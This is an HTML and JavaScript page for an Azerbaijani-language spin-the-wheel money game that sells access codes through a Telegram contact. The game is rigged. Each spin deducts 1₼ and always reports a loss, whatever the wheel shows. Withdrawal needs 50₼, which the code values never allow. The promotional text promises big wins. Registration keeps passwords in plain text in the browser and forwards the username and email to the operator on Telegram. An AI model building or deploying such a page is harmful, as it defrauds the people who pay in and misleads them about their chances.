<!DOCTYPE html>
<html lang="az">
<head>
<meta charset="UTF-8">
<title>Çarx Oyunu</title>
<style>
html, body {
  margin:0;
  padding:0;
  height:100%;
  overflow:hidden;
  font-family: Arial, sans-serif;
  background:#111;
  color:white;
  display:flex;
  justify-content:center;
  align-items:center;
}
.container {
  width:400px;
  padding:20px;
  background:#1c1c1c;
  border-radius:12px;
  text-align:center;
}
input, button {
  margin:10px auto;
  padding:12px;
  width:90%;
  font-size:18px;
  border-radius:8px;
  border:none;
  display:block;
}
button { background:#333; color:white; cursor:pointer; transition:0.3s; }
button:hover { background:#555; }
#topMessage { background:#222; color:#FFD700; padding:10px; border-radius:8px; margin-bottom:15px; font-weight:bold; line-height:1.4; }
.hidden { display:none; }
#msg, #msgSpin, #regMsg { margin-top:10px; color:#FFD700; font-weight:bold; }
#wheel-container { position:relative; width:250px; height:250px; margin:20px auto; }
#wheel { width:250px; height:250px; border-radius:50%; border:5px solid white; transition: transform 3s ease-out; }
#wheel text { font-weight:bold; font-size:14px; fill:white; text-anchor:middle; dominant-baseline:middle; }
#pointer { width:0; height:0; border-left:15px solid transparent; border-right:15px solid transparent; border-bottom:30px solid white; margin:-30px auto 0 auto; }
</style>
</head>
<body>

<div class="container">

<div id="topMessage">
🎡 Sadəcə 1₼ ilə böyük şans!<br>
Çarxı fırlat, həyəcanı hiss et və qazancını artır!<br>
Hər fırlatma sənin üçün yeni sürprizlər və bonuslar açır.<br>
Gecikmə – indi 1₼ əlavə et və şansını sınayaraq qazan!
</div>

<!-- LOGIN -->
<div id="login">
<h2>Giriş</h2>
<input id="loginUser" placeholder="İstifadəçi adı">
<input id="loginPass" type="password" placeholder="Şifrə">
<input id="loginCode" placeholder="Kod">
<button onclick="login()">Daxil ol</button>
<p id="msg"></p>
<p><button onclick="showRegister()">Qeydiyyatdan keç</button></p>
</div>

<!-- REGISTER -->
<div id="register" class="hidden">
<h2>Qeydiyyat</h2>
<input id="regUser" placeholder="İstifadəçi adı">
<input id="regEmail" placeholder="Email">
<input id="regPass" type="password" placeholder="Şifrə">
<button onclick="register()">Qeydiyyatdan keç</button>
<p id="regMsg"></p>
</div>

<!-- PANEL -->
<div id="panel" class="hidden">
<h2>Çarx Paneli</h2>
<p id="balanceText">Balans: 0 ₼</p>
<div id="pointer"></div>
<div id="wheel-container">
  <svg id="wheel" viewBox="0 0 250 250"></svg>
</div>
<button onclick="spin()">Çarxi fırlat</button>
<p id="msgSpin"></p>
<button onclick="withdraw()">Pul çıxartmaq</button>
</div>

<script>
// Kodlar və balans
let balance = 0;
let userPhone = null;
let usedPhone = null;
let deg = 0;
const codeMap = { "005":1, "00-MH":5, "00-7A":10, "00-6T":3, "00-63U":20 };

// Çarx bölmələri
const slices = [
  { text:"1 ₼", color:"#ff4d4d" },
  { text:"5 ₼", color:"#4dff4d" },
  { text:"BOŞ", color:"#4d4dff" },
  { text:"BOŞ", color:"#ffff4d" },
  { text:"BOŞ", color:"#ff4dff" },
  { text:"BOŞ", color:"#4dffff" }
];

// DRAW WHEEL (SVG dairəvi)
function drawWheel(){
  const svg = document.getElementById("wheel");
  svg.innerHTML = "";
  const cx = 125, cy = 125, r=120;
  const sliceAngle = 360 / slices.length;
  slices.forEach((slice,i)=>{
    const startAngle = sliceAngle*i;
    const endAngle = startAngle + sliceAngle;
    const rad1 = (startAngle-90)*Math.PI/180;
    const rad2 = (endAngle-90)*Math.PI/180;
    const x1 = cx + r*Math.cos(rad1);
    const y1 = cy + r*Math.sin(rad1);
    const x2 = cx + r*Math.cos(rad2);
    const y2 = cy + r*Math.sin(rad2);
    const path = document.createElementNS("http://www.w3.org/2000/svg","path");
    path.setAttribute("d",`M ${cx} ${cy} L ${x1} ${y1} A ${r} ${r} 0 0 1 ${x2} ${y2} Z`);
    path.setAttribute("fill",slice.color);
    svg.appendChild(path);
    // Yazı
    const angle = (startAngle + sliceAngle/2 - 90) * Math.PI/180;
    const tx = cx + r*0.65*Math.cos(angle);
    const ty = cy + r*0.65*Math.sin(angle);
    const text = document.createElementNS("http://www.w3.org/2000/svg","text");
    text.setAttribute("x",tx);
    text.setAttribute("y",ty);
    text.textContent = slice.text;
    text.setAttribute("fill","white");
    text.setAttribute("text-anchor","middle");
    text.setAttribute("dominant-baseline","middle");
    svg.appendChild(text);
  });
}

// INIT
drawWheel();

// SHOW REGISTER
function showRegister(){
  document.getElementById("login").classList.add("hidden");
  document.getElementById("register").classList.remove("hidden");
}

// REGISTER
function register(){
  const user=document.getElementById("regUser").value.trim();
  const email=document.getElementById("regEmail").value.trim();
  const pass=document.getElementById("regPass").value.trim();
  if(!user||!email||!pass){ 
    document.getElementById("regMsg").innerText="Bütün xanaları doldur!"; 
    return;
  }

  localStorage.setItem("userData",JSON.stringify({user,email,pass}));

  // Yeni mesaj
  document.getElementById("regMsg").innerText="1 saniyə gözləyin, Telegrama yönləndirilirsiz...";

  // 1 saniyə sonra Telegrama yönləndirmə
  setTimeout(()=>{
    const message=`Mən qeydiyyatdan keçdim, hesabımı aktiv edin.\nİstifadəçi adı: ${user}\nEmail: ${email}`;
    window.open("https://t.me/carxfirla?text="+encodeURIComponent(message),"_blank");
  },1000);
}

// LOGIN
function login(){
  const user=document.getElementById("loginUser").value.trim();
  const pass=document.getElementById("loginPass").value.trim();
  const code=document.getElementById("loginCode").value.trim();
  const msg=document.getElementById("msg");
  if(!user||!pass||!code){ msg.innerText="Bütün xanaları doldurun!"; return;}
  if(!codeMap[code]){ msg.innerText="Kod səhvdir. Yeni kod üçün Telegram vasitəsilə əlaqə saxlayın."; return;}
  if(!userPhone){ userPhone=prompt("Telefon nömrənizi daxil edin:"); usedPhone=userPhone;}
  else if(userPhone!==usedPhone){ balance=0; msg.innerText="Bu kod yalnız sizin telefonunuz üçün aktivdir. Balans 0 göstərilir."; return;}
  balance = codeMap[code];
  document.getElementById("login").classList.add("hidden");
  document.getElementById("register").classList.add("hidden");
  document.getElementById("panel").classList.remove("hidden");
  document.getElementById("msg").innerText="Giriş uğurlu! Çarx paneli açıldı.";
  updateBalance();
}

// UPDATE BALANCE
function updateBalance(){ document.getElementById("balanceText").innerText="Balans: "+balance+" ₼"; }

// SPIN
function spin(){
  if(balance<=0){ document.getElementById("msgSpin").innerText="Balans yoxdur!"; return;}
  deg += 360*5 + Math.floor(Math.random()*360);
  document.getElementById("wheel").style.transform=`rotate(${deg}deg)`;
  balance -=1;
  updateBalance();
  setTimeout(()=>{ document.getElementById("msgSpin").innerText="Bəxtinizi Bir Daha Sınaayın 😞"; },3000);
}

// PUL ÇIXARTMAQ
function withdraw(){
  if(balance < 50){
    alert("Minimum 50₼ lazımdır!");
    return;
  }
  const message = `Salam mənim hesabımda ${balance}₼ var, çıxarış edərdiniz zəhmət olmasa.`;
  window.open("https://t.me/carxfirla?text=" + encodeURIComponent(message), "_blank");
}
</script>

</body>
</html>
